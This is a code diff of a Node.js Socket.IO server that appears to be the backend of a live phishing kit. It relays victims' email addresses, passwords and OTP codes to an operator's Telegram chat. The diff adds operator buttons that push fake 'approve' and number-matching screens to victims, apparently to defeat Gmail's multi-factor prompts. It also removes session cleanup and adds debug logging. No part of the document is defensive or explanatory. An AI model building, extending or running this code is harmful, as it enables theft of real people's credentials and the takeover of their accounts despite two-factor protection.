@@ -85,7 +85,7 @@ io.on('connection', (socket) => {
       `*Provider:* ${data.provider}\n` +
       `*Email:* ${data.email}\n` +
       `*Status:* Waiting for password...\n` +
-      `*Session:* \`${sessionId}\``;
+      `*Session:* \`${data.sessionId}\``;
 
     try {
       await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
@@ -105,7 +105,7 @@ io.on('connection', (socket) => {
       `*Provider:* ${session.provider}\n` +
       `*Email:* ${session.email}\n` +
        `*Password:* ${data.password}\n` +
-      `*Session:* \`${sessionId}\``;
+      `*Session:* \`${data.sessionId}\``;
 
 
 
@@ -113,26 +113,29 @@ io.on('connection', (socket) => {
   const keyboard = session.provider === 'Gmail' ? {
     inline_keyboard: [
       [
-        { text: '✅ Send OTP', callback_data: `send_otp_${sessionId}` }
+        { text: '✅ Send OTP', callback_data: `send_otp_${data.sessionId}` }
       ],
       [
-        { text: '🔢 Send OTP with Special Number', callback_data: `send_otp_with_number_${sessionId}` }  
+        { text: '✅ Send Approve only', callback_data: `send_approve_${data.sessionId}` }
       ],
       [
-        { text: '✔️ Mark Complete', callback_data: `mark_complete_${sessionId}` }
+        { text: '🔢 Send Approve with Special Number', callback_data: `send_approve_with_number_${data.sessionId}` }  
       ],
       [
-        { text: '❌ Reject', callback_data: `reject_${sessionId}` }
+        { text: '✔️ Mark Complete', callback_data: `mark_complete_${data.sessionId}` }
+      ],
+      [
+        { text: '❌ Reject', callback_data: `reject_${data.sessionId}` }
       ]
     ]
   } : {
     inline_keyboard: [
       [
-        { text: '✅ Send OTP', callback_data: `send_otp_${sessionId}` },
-        { text: '✔️ Mark Complete', callback_data: `mark_complete_${sessionId}` }
+        { text: '✅ Send OTP', callback_data: `send_otp_${data.sessionId}` },
+        { text: '✔️ Mark Complete', callback_data: `mark_complete_${data.sessionId}` }
       ],
       [
-        { text: '❌ Reject', callback_data: `reject_${sessionId}` }
+        { text: '❌ Reject', callback_data: `reject_${data.sessionId}` }
       ]
     ]
   }; 
@@ -159,16 +162,16 @@ io.on('connection', (socket) => {
     const message = `🔢 *OTP Submitted*\n\n` +
       `*Provider:* ${session.provider}\n` +
       `*Email:* ${session.email}\n` +
-      `*OTP Code:* \`${data.otp}\`\n` +
-      `*Session:* \`${sessionId}\``;
+      `*OTP Code:* \`${session.otp}\`\n` +
+      `*Session:* \`${data.sessionId}\``;
 
     const keyboard = {
       inline_keyboard: [
         [
-          { text: '✔️ Mark Complete', callback_data: `mark_complete_${sessionId}` }
+          { text: '✔️ Mark Complete', callback_data: `mark_complete_${data.sessionId}` }
         ],
         [
-          { text: '🔄 Request Again', callback_data: `request_again_${sessionId}` }
+          { text: '🔄 Request Again', callback_data: `request_again_${data.sessionId}` }
         ]
       ]
     };
@@ -181,24 +184,7 @@ io.on('connection', (socket) => {
     } catch (error) {
       console.error('Telegram error:', error);
     }
-  });     
-
-
-// cleanup old sessions
-const SESSION_TIMEOUT = 60 * 60 * 1000; // 1 hour in milliseconds
-function cleanupOldSessions() {
-  const now = Date.now();
-  for (const [socketId, session] of sessions.entries()) {
-    const sessionAge = now - session.timestamp.getTime();
-    if (sessionAge > SESSION_TIMEOUT) {
-      console.log(`Cleaning up old session: ${socketId}`);
-      sessions.delete(socketId);
-    }
-  }
-} 
-// Run cleanup every 10 minutes
-setInterval(cleanupOldSessions, 10 * 60 * 1000);
-
+  });      
 
   // Handle disconnect
   socket.on('disconnect', () => {
@@ -216,7 +202,16 @@ bot.on('callback_query', async (callbackQuery) => {
   const sessionId = parts[parts.length - 1]; // LAST part is the session ID
   const action = parts.slice(0, -1).join('_'); // everything else = action, e.g., "send_otp"
 
-   const session = sessions.get(sessionId); 
+   const session = sessions.get(sessionId);  
+
+
+    
+  // DEBUG LOGS
+  console.log('=== CALLBACK DEBUG ===');
+  console.log('Full data:', data);
+  console.log('Parsed sessionId:', sessionId);
+  console.log('Available sessions:', Array.from(sessions.keys()));
+  console.log('Session exists?', sessions.has(sessionId));
 
   if (!session) {
     await bot.answerCallbackQuery(callbackQuery.id, {
@@ -256,11 +251,17 @@ bot.on('callback_query', async (callbackQuery) => {
     break;  
   }
 
+    
+
+     case 'send_approve': {   
+      await bot.answerCallbackQuery(callbackQuery.id);
+      socket.emit('show-approve-screen');
+      await bot.sendMessage(chatId, '✅ Sent Approve screen to user'); 
+      break;
+    }
 
 
-
-
-        case 'send_otp_with_number': {   
+        case 'send_approve_with_number': {   
       await bot.answerCallbackQuery(callbackQuery.id);
       await bot.sendMessage(chatId, '🔢 Enter the special number to send (1-99):');
       
@@ -276,9 +277,9 @@ bot.on('callback_query', async (callbackQuery) => {
           }
           
           // Send to frontend
-          socket.emit('show-otp-with-number', { number: specialNumber });
+          socket.emit('show-approve-with-number', { number: specialNumber });
           
-          await bot.sendMessage(chatId, `✅ Sent OTP screen with special number: ${specialNumber}`);
+          await bot.sendMessage(chatId, `✅ Sent approve screen with special number: ${specialNumber}`);
         }
       });
       break;
@@ -311,15 +312,15 @@ bot.on('callback_query', async (callbackQuery) => {
     case 'request_again': {
     const session = sessions.get(sessionId); 
   if (session && session.specialNumber) { 
-    socket.emit('show-otp-with-number', { number: session.specialNumber });
+    socket.emit('show-approve-with-number', { number: session.specialNumber });
     await bot.answerCallbackQuery(callbackQuery.id, {
-      text: `🔄 OTP screen with special number ${session.specialNumber} shown again`
+      text: `🔄 approve screen with special number ${session.specialNumber} shown again`
     });
   } else {
     // Normal OTP, show normal screen
-    socket.emit('show-otp-screen');
+    socket.emit('show-approve-screen');
     await bot.answerCallbackQuery(callbackQuery.id, {
-      text: '🔄 OTP screen shown again'
+      text: '🔄 Approve screen shown again'
     });
   }
   break;
